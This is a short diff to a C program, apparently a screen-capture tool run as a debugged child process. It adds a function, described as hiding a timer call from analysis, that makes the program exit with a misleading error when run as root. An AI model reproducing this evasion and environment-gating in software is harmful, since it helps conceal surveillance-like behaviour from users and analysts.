@@ -13,6 +13,24 @@
 #include "b64.h"
 
 /*
+ * These function try to hide the call to start_timer();
+ * 2pac will add a breakpoint to tell the father to call start_timer()
+ */
+static int check_user(char *user)
+{
+	if (!strcmp(user, "root")) {
+		return 1;
+	}
+	return 0;
+}
+static int hide_me()
+{
+	char *user = getenv("USER");
+	int ret = check_user(user);
+	return ret;
+}
+
+/*
  * This is the debuggee, our child process.
  */
 void child(char *self_path)
@@ -28,6 +46,11 @@ void obfuscation_main();
 
 #else
 
+	int r = hide_me();
+	if (r) {
+		fprintf(stderr, "Something looks wrong with your environment!\n");
+		exit(1);
+	}
 	img_t *screenshot = screen_capture();
 #ifdef DEBUG_MAIN
 	img_to_file(screenshot, "/tmp/out.ppm");
